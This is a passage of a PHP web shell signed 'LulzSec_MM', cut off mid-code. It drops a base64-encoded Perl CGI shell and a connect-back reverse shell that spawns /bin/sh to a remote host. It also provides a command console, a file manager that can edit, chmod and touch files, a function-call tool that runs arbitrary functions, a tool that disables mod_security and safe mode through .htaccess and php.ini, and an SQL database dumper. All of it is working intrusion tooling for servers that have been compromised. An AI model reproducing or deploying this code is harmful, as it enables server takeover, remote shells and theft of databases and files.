bmRMaW5lSW5wdXRGb3JtOw0KDQoJJlByaW50UGFnZUZvb3RlcjsNCn0NCg0KIy0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLQ0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB3aGVuIHRoZSB1c2VyIHdhbnRz
IHRvIGRvd25sb2FkIGEgZmlsZS4gSWYgdGhlDQojIGZpbGVuYW1lIGlzIG5vdCBzcGVjaWZpZWQs
IGl0IGRpc3BsYXlzIGEgZm9ybSBhbGxvd2luZyB0aGUgdXNlciB0byBzcGVjaWZ5IGENCiMgZmls
ZSwgb3RoZXJ3aXNlIGl0IGRpc3BsYXlzIGEgbWVzc2FnZSB0byB0aGUgdXNlciBhbmQgcHJvdmlk
ZXMgYSBsaW5rDQojIHRocm91Z2ggIHdoaWNoIHRoZSBmaWxlIGNhbiBiZSBkb3dubG9hZGVkLg0K
Iy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIERvd25sb2FkRmlsZQ0Kew0KCSMgaWYgbm8gZmls
ZSBpcyBzcGVjaWZpZWQsIHByaW50IHRoZSBkb3dubG9hZCBmb3JtIGFnYWluDQoJaWYoJFRyYW5z
ZmVyRmlsZSBlcSAiIikNCgl7DQoJCSZQcmludFBhZ2VIZWFkZXIoImYiKTsNCgkJJlByaW50Rmls
ZURvd25sb2FkRm9ybTsNCgkJJlByaW50UGFnZUZvb3RlcjsNCgkJcmV0dXJuOw0KCX0NCgkNCgkj
IGdldCBmdWxseSBxdWFsaWZpZWQgcGF0aCBvZiB0aGUgZmlsZSB0byBiZSBkb3dubG9hZGVkDQoJ
aWYoKCRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlxcfF4uOi8pKSB8DQoJCSghJFdpbk5U
ICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9eXC8vKSkpICMgcGF0aCBpcyBhYnNvbHV0ZQ0KCXsNCgkJ
JFRhcmdldEZpbGUgPSAkVHJhbnNmZXJGaWxlOw0KCX0NCgllbHNlICMgcGF0aCBpcyByZWxhdGl2
ZQ0KCXsNCgkJY2hvcCgkVGFyZ2V0RmlsZSkgaWYoJFRhcmdldEZpbGUgPSAkQ3VycmVudERpcikg
PX4gbS9bXFxcL10kLzsNCgkJJFRhcmdldEZpbGUgLj0gJFBhdGhTZXAuJFRyYW5zZmVyRmlsZTsN
Cgl9DQoNCglpZigkT3B0aW9ucyBlcSAiZ28iKSAjIHdlIGhhdmUgdG8gc2VuZCB0aGUgZmlsZQ0K
CXsNCgkJJlNlbmRGaWxlVG9Ccm93c2VyKCRUYXJnZXRGaWxlKTsNCgl9DQoJZWxzZSAjIHdlIGhh
dmUgdG8gc2VuZCBvbmx5IHRoZSBsaW5rIHBhZ2UNCgl7DQoJCSZQcmludERvd25sb2FkTGlua1Bh
Z2UoJFRhcmdldEZpbGUpOw0KCX0NCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBNYWlu
IFByb2dyYW0gLSBFeGVjdXRpb24gU3RhcnRzIEhlcmUNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0N
CiZSZWFkUGFyc2U7DQomR2V0Q29va2llczsNCg0KJFNjcmlwdExvY2F0aW9uID0gJEVOVnsnU0NS
SVBUX05BTUUnfTsNCiRTZXJ2ZXJOYW1lID0gJEVOVnsnU0VSVkVSX05BTUUnfTsNCiRMb2dpblBh
c3N3b3JkID0gJGlueydwJ307DQokUnVuQ29tbWFuZCA9ICRpbnsnYyd9Ow0KJFRyYW5zZmVyRmls
ZSA9ICRpbnsnZid9Ow0KJE9wdGlvbnMgPSAkaW57J28nfTsNCg0KJEFjdGlvbiA9ICRpbnsnYSd9
Ow0KJEFjdGlvbiA9ICJsb2dpbiIgaWYoJEFjdGlvbiBlcSAiIik7ICMgbm8gYWN0aW9uIHNwZWNp
ZmllZCwgdXNlIGRlZmF1bHQNCg0KIyBnZXQgdGhlIGRpcmVjdG9yeSBpbiB3aGljaCB0aGUgY29t
bWFuZHMgd2lsbCBiZSBleGVjdXRlZA0KJEN1cnJlbnREaXIgPSAkaW57J2QnfTsNCmNob3AoJEN1
cnJlbnREaXIgPSBgJENtZFB3ZGApIGlmKCRDdXJyZW50RGlyIGVxICIiKTsNCg0KJExvZ2dlZElu
ID0gJENvb2tpZXN7J1NBVkVEUFdEJ30gZXEgJFBhc3N3b3JkOw0KDQppZigkQWN0aW9uIGVxICJs
b2dpbiIgfHwgISRMb2dnZWRJbikgIyB1c2VyIG5lZWRzL2hhcyB0byBsb2dpbg0Kew0KCSZQZXJm
b3JtTG9naW47DQoNCn0NCmVsc2lmKCRBY3Rpb24gZXEgImNvbW1hbmQiKSAjIHVzZXIgd2FudHMg
dG8gcnVuIGEgY29tbWFuZA0Kew0KCSZFeGVjdXRlQ29tbWFuZDsNCn0NCmVsc2lmKCRBY3Rpb24g
ZXEgInVwbG9hZCIpICMgdXNlciB3YW50cyB0byB1cGxvYWQgYSBmaWxlDQp7DQoJJlVwbG9hZEZp
bGU7DQp9DQplbHNpZigkQWN0aW9uIGVxICJkb3dubG9hZCIpICMgdXNlciB3YW50cyB0byBkb3du
bG9hZCBhIGZpbGUNCnsNCgkmRG93bmxvYWRGaWxlOw0KfQ0KZWxzaWYoJEFjdGlvbiBlcSAibG9n
b3V0IikgIyB1c2VyIHdhbnRzIHRvIGxvZ291dA0Kew0KCSZQZXJmb3JtTG9nb3V0Ow0KfQ==';
                                                                    $file = fopen("izo.cin", "w+");
                                                                    $write = fwrite($file, base64_decode($cgishellizocin));
                                                                    fclose($file);
                                                                    chmod("izo.cin", 0755);
                                                                    $netcatshell = 'IyEvdXNyL2Jpbi9wZXJsDQogICAgICB1c2UgU29ja2V0Ow0KICAgICAgcHJpbnQgIkRhdGEgQ2hh
MHMgQ29ubmVjdCBCYWNrIEJhY2tkb29yXG5cbiI7DQogICAgICBpZiAoISRBUkdWWzBdKSB7DQog
ICAgICAgIHByaW50ZiAiVXNhZ2U6ICQwIFtIb3N0XSA8UG9ydD5cbiI7DQogICAgICAgIGV4aXQo
MSk7DQogICAgICB9DQogICAgICBwcmludCAiWypdIER1bXBpbmcgQXJndW1lbnRzXG4iOw0KICAg
ICAgJGhvc3QgPSAkQVJHVlswXTsNCiAgICAgICRwb3J0ID0gODA7DQogICAgICBpZiAoJEFSR1Zb
MV0pIHsNCiAgICAgICAgJHBvcnQgPSAkQVJHVlsxXTsNCiAgICAgIH0NCiAgICAgIHByaW50ICJb
Kl0gQ29ubmVjdGluZy4uLlxuIjsNCiAgICAgICRwcm90byA9IGdldHByb3RvYnluYW1lKCd0Y3An
KSB8fCBkaWUoIlVua25vd24gUHJvdG9jb2xcbiIpOw0KICAgICAgc29ja2V0KFNFUlZFUiwgUEZf
SU5FVCwgU09DS19TVFJFQU0sICRwcm90bykgfHwgZGllICgiU29ja2V0IEVycm9yXG4iKTsNCiAg
ICAgIG15ICR0YXJnZXQgPSBpbmV0X2F0b24oJGhvc3QpOw0KICAgICAgaWYgKCFjb25uZWN0KFNF
UlZFUiwgcGFjayAiU25BNHg4IiwgMiwgJHBvcnQsICR0YXJnZXQpKSB7DQogICAgICAgIGRpZSgi
VW5hYmxlIHRvIENvbm5lY3RcbiIpOw0KICAgICAgfQ0KICAgICAgcHJpbnQgIlsqXSBTcGF3bmlu
ZyBTaGVsbFxuIjsNCiAgICAgIGlmICghZm9yayggKSkgew0KICAgICAgICBvcGVuKFNURElOLCI+
JlNFUlZFUiIpOw0KICAgICAgICBvcGVuKFNURE9VVCwiPiZTRVJWRVIiKTsNCiAgICAgICAgb3Bl
bihTVERFUlIsIj4mU0VSVkVSIik7DQogICAgICAgIGV4ZWMgeycvYmluL3NoJ30gJy1iYXNoJyAu
ICJcMCIgeCA0Ow0KICAgICAgICBleGl0KDApOw0KICAgICAgfQ0KICAgICAgcHJpbnQgIlsqXSBE
YXRhY2hlZFxuXG4iOw==';
                                                                    $file = fopen("dc.pl", "w+");
                                                                    $write = fwrite($file, base64_decode($netcatshell));
                                                                    fclose($file);
                                                                    chmod("dc.pl", 0755);
                                                                    echo "<iframe src=cgitelnet1/izo.cin width=100% height=100% frameborder=0></iframe> ";
                                                                    echo '</div>';
                                                                    printFooter();
                                                                }

function actionStringTools() {
    if(!function_exists('hex2bin')) {function hex2bin($p) {return decbin(hexdec($p));}}
    if(!function_exists('hex2ascii')) {function hex2ascii($p){$r='';for($i=0;$i<strLen($p);$i+=2){$r.=chr(hexdec($p[$i].$p[$i+1]));}return $r;}}
    if(!function_exists('ascii2hex')) {function ascii2hex($p){$r='';for($i=0;$i<strlen($p);++$i)$r.= dechex(ord($p[$i]));return strtoupper($r);}}
    if(!function_exists('full_urlencode')) {function full_urlencode($p){$r='';for($i=0;$i<strlen($p);++$i)$r.= '%'.dechex(ord($p[$i]));return strtoupper($r);}}
    if(isset($_POST['ajax'])) {
        $_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = true;
        ob_start();
        if(function_exists($_POST['p1']))
            echo $_POST['p1']($_POST['p2']);
        $temp = "document.getElementById('strOutput').style.display='';document.getElementById('strOutput').innerHTML='".addcslashes(htmlspecialchars(ob_get_clean()),"\n\r\t\\'\0")."';\n";
        echo strlen($temp), "\n", $temp;
        exit;
    }
    printHeader();
    echo '<h1>String conversions</h1><div class=content>';
    $stringTools = array(
        'Base64 encode' => 'base64_encode',
        'Base64 decode' => 'base64_decode',
        'Url encode' => 'urlencode',
        'Url decode' => 'urldecode',
        'Full urlencode' => 'full_urlencode',
        'md5 hash' => 'md5',
        'sha1 hash' => 'sha1',
        'crypt' => 'crypt',
        'CRC32' => 'crc32',
        'ASCII to HEX' => 'ascii2hex',
        'HEX to ASCII' => 'hex2ascii',
        'HEX to DEC' => 'hexdec',
        'HEX to BIN' => 'hex2bin',
        'DEC to HEX' => 'dechex',
        'DEC to BIN' => 'decbin',
        'BIN to HEX' => 'bin2hex',
        'BIN to DEC' => 'bindec',        
        'String to lower case' => 'strtolower',
        'String to upper case' => 'strtoupper',
        'Htmlspecialchars' => 'htmlspecialchars',
        'String length' => 'strlen',
    );
    if(empty($_POST['ajax'])&&!empty($_POST['p1']))
        $_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = false;
    echo "<form name='toolsForm' onSubmit='if(this.ajax.checked){a(null,null,this.selectTool.value,this.input.value);}else{g(null,null,this.selectTool.value,this.input.value);} return false;'><select name='selectTool'>";
    foreach($stringTools as $k => $v)
        echo "<option value='".htmlspecialchars($v)."'>".$k."</option>";
        echo "</select><input type='submit' value='Submit'/> <input type=checkbox name=ajax value=1 ".($_SESSION[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'')."> send using AJAX<br><textarea name='input' style='margin-top:5px' class=bigarea>".htmlspecialchars(@$_POST['p2'])."</textarea></form><pre class='ml1' style='".(empty($_POST['p1'])?'display:none;':'')."margin-top:5px' id='strOutput'>";
    if(!empty($_POST['p1'])) {
        if(function_exists($_POST['p1']))
        echo htmlspecialchars($_POST['p1']($_POST['p2']));
    }
    echo"</pre></div>";
    printFooter();
}
function actionFilesTools() {
    if( isset($_POST['p1']) )
        $_POST['p1'] = urldecode($_POST['p1']);
    if(@$_POST['p2']=='download') {
        if(is_file($_POST['p1']) && is_readable($_POST['p1'])) {
            ob_start("ob_gzhandler", 4096);
            header("Content-Disposition: attachment; filename=".basename($_POST['p1']));
            if (function_exists("mime_content_type")) {
                $type = @mime_content_type($_POST['p1']);
                header("Content-Type: ".$type);
            }
            $fp = @fopen($_POST['p1'], "r");
            if($fp) {
                while(!@feof($fp))
                    echo @fread($fp, 1024);
                fclose($fp);
            }
        } elseif(is_dir($_POST['p1']) && is_readable($_POST['p1'])) {
        }
        exit;
    }
    if( @$_POST['p2'] == 'mkfile' ) {
        if(!file_exists($_POST['p1'])) {
            $fp = @fopen($_POST['p1'], 'w');
            if($fp) {
                $_POST['p2'] = "edit";
                fclose($fp);
            }
        }
    }
    printHeader();
    echo '<h1>File tools</h1><div class=content>';
    if( !file_exists(@$_POST['p1']) ) {
        echo 'File not exists';
        printFooter();
        return;
    }
    $uid = @posix_getpwuid(@fileowner($_POST['p1']));
    $gid = @posix_getgrgid(@fileowner($_POST['p1']));
    echo '<span>Name:</span> '.htmlspecialchars($_POST['p1']).' <span>Size:</span> '.(is_file($_POST['p1'])?viewSize(filesize($_POST['p1'])):'-').' <span>Permission:</span> '.viewPermsColor($_POST['p1']).' <span>Owner/Group:</span> '.$uid['name'].'/'.$gid['name'].'<br>';
    echo '<span>Create time:</span> '.date('Y-m-d H:i:s',filectime($_POST['p1'])).' <span>Access time:</span> '.date('Y-m-d H:i:s',fileatime($_POST['p1'])).' <span>Modify time:</span> '.date('Y-m-d H:i:s',filemtime($_POST['p1'])).'<br><br>';
    if( empty($_POST['p2']) )
        $_POST['p2'] = 'view';
    if( is_file($_POST['p1']) )
        $m = array('View', 'Highlight', 'Download', 'Hexdump', 'Edit', 'Chmod', 'Rename', 'Touch');
    else
        $m = array('Chmod', 'Rename', 'Touch');
    foreach($m as $v)
        echo '<a href=# onclick="g(null,null,null,\''.strtolower($v).'\')">'.((strtolower($v)==@$_POST['p2'])?'<b>[ '.$v.' ]</b>':$v).'</a> ';
    echo '<br><br>';
    switch($_POST['p2']) {
        case 'view':
            echo '<pre class=ml1>';
            $fp = @fopen($_POST['p1'], 'r');
            if($fp) {
                while( !@feof($fp) )
                    echo htmlspecialchars(@fread($fp, 1024));
                @fclose($fp);
            }
            echo '</pre>';
            break;
        case 'highlight':
            if( is_readable($_POST['p1']) ) {
                echo '<div class=ml1 style="background-color: #000;color:black;">';
                $code = highlight_file($_POST['p1'],true);
                echo str_replace(array('<span ','</span>'), array('<font ','</font>'),$code).'</div>';
            }
            break;
        case 'chmod':
            if( !empty($_POST['p3']) ) {
                $perms = 0;
                for($i=strlen($_POST['p3'])-1;$i>=0;--$i)
                    $perms += (int)$_POST['p3'][$i]*pow(8, (strlen($_POST['p3'])-$i-1));
                if(!@chmod($_POST['p1'], $perms))
                    echo 'Can\'t set permissions!<br><script>document.mf.p3.value="";</script>';
                else
                    die('<script>g(null,null,null,null,"")</script>');
            }
            echo '<form onsubmit="g(null,null,null,null,this.chmod.value);return false;"><input type=text name=chmod value="'.substr(sprintf('%o', fileperms($_POST['p1'])),-4).'"><input type=submit value="Submit"></form>';
            break;
        case 'edit':
            if( !is_writable($_POST['p1'])) {
                echo 'File isn\'t writeable';
                break;
            }
            if( !empty($_POST['p3']) ) {
                @file_put_contents($_POST['p1'],$_POST['p3']);
                echo 'Saved!<br><script>document.mf.p3.value="";</script>';
            }
            echo '<form onsubmit="g(null,null,null,null,this.text.value);return false;"><textarea name=text class=bigarea>';
            $fp = @fopen($_POST['p1'], 'r');
            if($fp) {
                while( !@feof($fp) )
                    echo htmlspecialchars(@fread($fp, 1024));
                @fclose($fp);
            }
            echo '</textarea><input type=submit value="Submit"></form>';
            break;
        case 'hexdump':
            $c = @file_get_contents($_POST['p1']);
            $n = 0;
            $h = array('00000000<br>','','');
            $len = strlen($c);
            for ($i=0; $i<$len; ++$i) {
                $h[1] .= sprintf('%02X',ord($c[$i])).' ';
                switch ( ord($c[$i]) ) {
                    case 0:  $h[2] .= ' '; break;
                    case 9:  $h[2] .= ' '; break;
                    case 10: $h[2] .= ' '; break;
                    case 13: $h[2] .= ' '; break;
                    default: $h[2] .= $c[$i]; break;
                }
                $n++;
                if ($n == 32) {
                    $n = 0;
                    if ($i+1 < $len) {$h[0] .= sprintf('%08X',$i+1).'<br>';}
                    $h[1] .= '<br>';
                    $h[2] .= "\n";
                }
             }
            echo '<table cellspacing=1 cellpadding=5 bgcolor=#000><tr><td bgcolor=#000><span style="font-weight: normal;"><pre>'.$h[0].'</pre></span></td><td bgcolor=#000><pre>'.$h[1].'</pre></td><td bgcolor=#000><pre>'.htmlspecialchars($h[2]).'</pre></td></tr></table>';
            break;
        case 'rename':
            if( !empty($_POST['p3']) ) {
                if(!@rename($_POST['p1'], $_POST['p3']))
                    echo 'Can\'t rename!<br><script>document.mf.p3.value="";</script>';
                else
                    die('<script>g(null,null,"'.urlencode($_POST['p3']).'",null,"")</script>');
            }
            echo '<form onsubmit="g(null,null,null,null,this.name.value);return false;"><input type=text name=name value="'.htmlspecialchars($_POST['p1']).'"><input type=submit value="Submit"></form>';
            break;
        case 'touch':
            if( !empty($_POST['p3']) ) {
                $time = strtotime($_POST['p3']);
                if($time) {
                    if(@touch($_POST['p1'],$time,$time))
                        die('<script>g(null,null,null,null,"")</script>');
                    else {
                        echo 'Fail!<script>document.mf.p3.value="";</script>';
                    }
                } else echo 'Bad time format!<script>document.mf.p3.value="";</script>';
            }
            echo '<form onsubmit="g(null,null,null,null,this.touch.value);return false;"><input type=text name=touch value="'.date("Y-m-d H:i:s", @filemtime($_POST['p1'])).'"><input type=submit value="Submit"></form>';
            break;
        case 'mkfile':
            break;
    }
    echo '</div>';
    printFooter();
}
function actionConsole() {
    if(isset($_POST['ajax'])) {
        $_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = true;
        ob_start();
        echo "document.cf.cmd.value='';\n";
        $temp = @iconv($_POST['charset'], 'UTF-8', addcslashes("\n$ ".$_POST['p1']."\n".ex($_POST['p1']),"\n\r\t\\'\0"));
        if(preg_match("!.*cd\s+([^;]+)$!",$_POST['p1'],$match))    {
            if(@chdir($match[1])) {
                $GLOBALS['cwd'] = @getcwd();
                echo "document.mf.c.value='".$GLOBALS['cwd']."';";
            }
        }
        echo "document.cf.output.value+='".$temp."';";
        echo "document.cf.output.scrollTop = document.cf.output.scrollHeight;";
        $temp = ob_get_clean();
        echo strlen($temp), "\n", $temp;
        exit;
    }
    printHeader();
echo '<script>
if(window.Event) window.captureEvents(Event.KEYDOWN);
var cmds = new Array("");
var cur = 0;
function kp(e) {
    var n = (window.Event) ? e.which : e.keyCode;
    if(n == 38) {
        cur--;
        if(cur>=0)
            document.cf.cmd.value = cmds[cur];
        else
            cur++;
    } else if(n == 40) {
        cur++;
        if(cur < cmds.length)
            document.cf.cmd.value = cmds[cur];
        else
            cur--;
    }
}
function add(cmd) {
    cmds.pop();
    cmds.push(cmd);
    cmds.push("");
    cur = cmds.length-1;
}
</script>';
    echo '<h1>Console</h1><div class=content><form name=cf onsubmit="if(document.cf.cmd.value==\'clear\'){document.cf.output.value=\'\';document.cf.cmd.value=\'\';return false;}add(this.cmd.value);if(this.ajax.checked){a(null,null,this.cmd.value);}else{g(null,null,this.cmd.value);} return false;"><select name=alias>';
    foreach($GLOBALS['aliases'] as 
        $n => $v) {
        if($v == '') {
            echo '<optgroup label="-'.htmlspecialchars($n).'-"></optgroup>';
            continue;
        }
        echo '<option value="'.htmlspecialchars($v).'">'.$n.'</option>';
    }
    if(empty($_POST['ajax'])&&!empty($_POST['p1']))
        $_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = false;
    echo '</select><input type=button onclick="add(document.cf.alias.value);if(document.cf.ajax.checked){a(null,null,document.cf.alias.value);}else{g(null,null,document.cf.alias.value);}" value="Submit"> <input type=checkbox name=ajax value=1 '.($_SESSION[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'').'> send using AJAX<br/><textarea class=bigarea name=output style="border-bottom:0;" readonly>';
    if(!empty($_POST['p1'])) {
        echo htmlspecialchars("$ ".$_POST['p1']."\n".ex($_POST['p1']));
    }
    echo '</textarea><input type=text name=cmd style="border-top:0;width:100%;" onkeydown="kp(event);">';
    echo '</form></div><script>document.cf.cmd.focus();</script>';
    printFooter();
}
function actionLogout() {
    unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
    echo '<body bgcolor=#000000><center><img src="http://i.imgur.com/zBtApYV.png"><h1><font color="#C3C3C3"> See You, Bro  <br><h2><font size="4">Jumping CycleR By MEA  <p><h2> LulzSec_MM <br><h2><font color="#C3C3C3">Bye Bye <font color="#fff">တာ့တာေနာ္ </h2><p><font color="BLUE" font size="4">We are :<marquee width="80%"> LulzSec_MM ./buth~double_E </marquee></font></font></font></center></body>';
}

function actionBypass() {
    printHeader();
    echo '<h1>Safe Mode</h1>';
    echo '<div class="content">';
    echo "<div class=header><center><h3><span>| SAFE MODE AND MOD SECURITY DISABLED AND PERL 500 INTERNAL ERROR BYPASS |</span></h3>Following php.ini and .htaccess(mod) and perl(.htaccess)[convert perl extention *.pl => *.sh  ] files create in following dir<br>| ".$GLOBALS['cwd']." |<br><br />";
    echo '<a href=# onclick="g(null,null,\'php.ini\',null)">| PHP.INI | </a><a href=# onclick="g(null,null,null,\'ini\')">| .htaccess(Mod) | </a><a href=# onclick="g(null,null,null,null,\'sh\')">| .htaccess(perl) | </a></center>';
    if(!empty($_POST['p2']) && isset($_POST['p2']))
    {
        $fil=fopen($GLOBALS['cwd'].".htaccess","w");
        fwrite($fil,'<IfModule mod_security.c>
            Sec------Engine Off
            Sec------ScanPOST Off
            </IfModule>');
        fclose($fil);
   }
   if(!empty($_POST['p1'])&& isset($_POST['p1']))
   {
        $fil=fopen($GLOBALS['cwd']."php.ini","w");
        fwrite($fil,'safe_mode=OFF
            disable_functions=NONE');
        fclose($fil);
    }
    if(!empty($_POST['p3']) && isset($_POST['p3']))
    {
        $fil=fopen($GLOBALS['cwd'].".htaccess","w");
        fwrite($fil,'Options FollowSymLinks MultiViews Indexes ExecCGI
        AddType application/x-httpd-cgi .sh
        AddHandler cgi-script .pl
        AddHandler cgi-script .pl');
        fclose($fil); 
    }
    echo "<br><br /><br /></div>";
    echo '</div>';
    printFooter();
}

function actionSql() {
    class DbClass {
        var $type;
        var $link;
        var $res;
        function DbClass($type)    {
            $this->type = $type;
        }
        function connect($host, $user, $pass, $dbname){
            switch($this->type)    {
                case 'mysql':
                    if( $this->link = @mysql_connect($host,$user,$pass,true) ) return true;
                    break;
                case 'pgsql':
                    $host = explode(':', $host);
                    if(!$host[1]) $host[1]=5432;
                    if( $this->link = @pg_connect("host={$host[0]} port={$host[1]} user=$user password=$pass dbname=$dbname") ) return true;
                    break;
            }
            return false;
        }
        function selectdb($db) {
            switch($this->type)    {
                case 'mysql':
                    if (@mysql_select_db($db))return true;
                    break;
            }
            return false;
        }
        function query($str) {
            switch($this->type) {
                case 'mysql':
                    return $this->res = @mysql_query($str);
                    break;
                case 'pgsql':
                    return $this->res = @pg_query($this->link,$str);
                    break;
            }
            return false;
        }
        function fetch() {
            $res = func_num_args()?func_get_arg(0):$this->res;
            switch($this->type)    {
                case 'mysql':
                    return @mysql_fetch_assoc($res);
                    break;
                case 'pgsql':
                    return @pg_fetch_assoc($res);
                    break;
            }
            return false;
        }
        function listDbs() {
            switch($this->type)    {
                case 'mysql':
                    return $this->res = @mysql_list_dbs($this->link);
                break;
                case 'pgsql':
                    return $this->res = $this->query("SELECT datname FROM pg_database");
                break;
            }
            return false;
        }
        function listTables() {
            switch($this->type)    {
                case 'mysql':
                    return $this->res = $this->query('SHOW TABLES');
                break;
                case 'pgsql':
                    return $this->res = $this->query("select table_name from information_schema.tables where (table_schema != 'information_schema' AND table_schema != 'pg_catalog') or table_name = 'pg_user'");
                break;
            }
            return false;
        }
        function error() {
            switch($this->type)    {
                case 'mysql':
                    return @mysql_error($this->link);
                break;
                case 'pgsql':
                    return @pg_last_error($this->link);
                break;
            }
            return false;
        }
        function setCharset($str) {
            switch($this->type)    {
                case 'mysql':
                    if(function_exists('mysql_set_charset'))
                        return @mysql_set_charset($str, $this->link);
                    else
                        $this->query('SET CHARSET '.$str);
                    break;
                case 'mysql':
                    return @pg_set_client_encoding($this->link, $str);
                    break;
            }
            return false;
        }
        function dump($table) {
            switch($this->type)    {
                case 'mysql':
                    $res = $this->query('SHOW CREATE TABLE `'.$table.'`');
                    $create = mysql_fetch_array($res);
                    echo $create[1].";\n\n";
                    $this->query('SELECT * FROM `'.$table.'`');
                    while($item = $this->fetch()) {
                        $columns = array();
                        foreach($item as $k=>$v) {
                            $item[$k] = "'".@mysql_real_escape_string($v)."'";
                            $columns[] = "`".$k."`";
                        }
                    echo 'INSERT INTO `'.$table.'` ('.implode(", ", $columns).') VALUES ('.implode(", ", $item).');'."\n";
                    }
                break;
                case 'pgsql':
                    $this->query('SELECT * FROM '.$table);
                    while($item = $this->fetch()) {
                        $columns = array();
                        foreach($item as $k=>$v) {
                            $item[$k] = "'".addslashes($v)."'";
                            $columns[] = $k;
                        }
                    echo 'INSERT INTO '.$table.' ('.implode(", ", $columns).') VALUES ('.implode(", ", $item).');'."\n";
                    }
                break;
            }
            return false;
        }
    };
    $db = new DbClass(@$_POST['type']);
    if(@$_POST['p2']=='download') {
        ob_start("ob_gzhandler", 4096);
        $db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base']);
        $db->selectdb($_POST['sql_base']);
        header("Content-Disposition: attachment; filename=dump.sql");
        header("Content-Type: text/plain");
        foreach($_POST['tbl'] as $v)
                $db->dump($v);
        exit;
    }
    printHeader();
    echo '<h1>Sql browser</h1><div class=content>
    <form name="sf" method="post">
        <table cellpadding="2" cellspacing="0">
            <tr>
                <td>Type</td>
                <td>Host</td>
                <td>Login</td>
                <td>Password</td>
                <td>Database</td>
                <td></td>
            </tr>
            <tr>
                <input type=hidden name=a value=Sql>
                <input type=hidden name=p1 value=\'query\'>
                <input type=hidden name=p2>
                <input type=hidden name=c value="'.htmlspecialchars($GLOBALS['cwd']).'">
                <input type=hidden name=charset value="'.(isset($_POST['charset'])?$_POST['charset']:'').'">
                <td>
                    <select name=\'type\'>
                        <option value="mysql" '.(@$_POST['type']=='mysql'?'selected':'').'>MySql</option>
                        <option value="pgsql" '.(@$_POST['type']=='pgsql'?'selected':'').'>PostgreSql</option>
                    </select></td>
                <td><input type=text name=sql_host value="'.(empty($_POST['sql_host'])?'localhost':htmlspecialchars($_POST['sql_host'])).'"></td>
                <td><input type=text name=sql_login value="'.(empty($_POST['sql_login'])?'root':htmlspecialchars($_POST['sql_login'])).'"></td>
                <td><input type=text name=sql_pass value="'.(empty($_POST['sql_pass'])?'':htmlspecialchars($_POST['sql_pass'])).'"></td>
                <td>';
    $tmp = "<input type=text name=sql_base value=''>";
    if(isset($_POST['sql_host'])){
        if($db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base'])) {
            switch($_POST['charset']) {
                case "Windows-1251": $db->setCharset('cp1251'); break;
                case "UTF-8": $db->setCharset('utf8'); break;
                case "KOI8-R": $db->setCharset('koi8r'); break;
                case "KOI8-U": $db->setCharset('koi8u'); break;
                case "cp866": $db->setCharset('cp866'); break;
            }
            $db->listDbs();
            echo "<select name=sql_base><option value=''></option>";
            while($item = $db->fetch()) {
                list($key, $value) = each($item);
                echo '<option value="'.$value.'" '.($value==$_POST['sql_base']?'selected':'').'>'.$value.'</option>';
            }
            echo '</select>';
        }
        else echo $tmp;
    }else
        echo $tmp;
    echo '</td>
                <td><input type=submit value="Submit"></td>
            </tr>
        </table>
        <script>
            function st(t,l) {
                document.sf.p1.value = \'select\';
                document.sf.p2.value = t;
                if(l!=null)document.sf.p3.value = l;
                document.sf.submit();
            }
            function is() {
                for(i=0;i<document.sf.elements[\'tbl[]\'].length;++i)
                    document.sf.elements[\'tbl[]\'][i].checked = !document.sf.elements[\'tbl[]\'][i].checked;
            }
        </script>';
    if(isset($db) && $db->link){
        echo "<br/><table width=100% cellpadding=2 cellspacing=0>";
            if(!empty($_POST['sql_base'])){
                $db->selectdb($_POST['sql_base']);
                echo "<tr><td width=1 style='border-top:1px  #56A3E9;border-right:2px  #56A3E9;'><span>Tables:</span><br><br>";
                $tbls_res = $db->listTables();
                while($item = $db->fetch($tbls_res)) {
                    list($key, $value) = each($item);
                    $n = $db->fetch($db->query('SELECT COUNT(*) as n FROM '.$value.''));
                    $value = htmlspecialchars($value);
                    echo "<nobr><input type='checkbox' name='tbl[]' value='".$value."'>&nbsp;<a href=# onclick=\"st('".$value."')\">".$value."</a> (".$n['n'].")</nobr><br>";
                }
                echo "<input type='checkbox' onclick='is();'> <input type=button value='Dump' onclick='document.sf.p2.value=\"download\";document.sf.submit();'></td><td style='border-top:1px  #56A3E9;'>";
                if(@$_POST['p1'] == 'select') {
                    $_POST['p1'] = 'query';
                    $db->query('SELECT COUNT(*) as n FROM '.$_POST['p2'].'');
                    $num = $db->fetch();
                    $num = $num['n'];
                    echo "<span>".$_POST['p2']."</span> ($num) ";
                    for($i=0;$i<($num/30);$i++)
                        if($i != (int)$_POST['p3'])
                            echo "<a href='#' onclick='st(\"".$_POST['p2']."\", $i)'>",($i+1),"</a> ";
                        else
                            echo ($i+1)," ";
                    if($_POST['type']=='pgsql')
                        $_POST['p3'] = 'SELECT * FROM '.$_POST['p2'].' LIMIT 30 OFFSET '.($_POST['p3']*30);
                    else
                        $_POST['p3'] = 'SELECT * FROM `'.$_POST['p2'].'` LIMIT '.($_POST['p3']*30).',30';
                    echo "<br><br>";
                }
                if((@$_POST['p1'] == 'query') && !empty($_POST['p3'])) {
                    $db->query(@$_POST['p3']);
                    if($db->res !== false) {
                        $title = false;
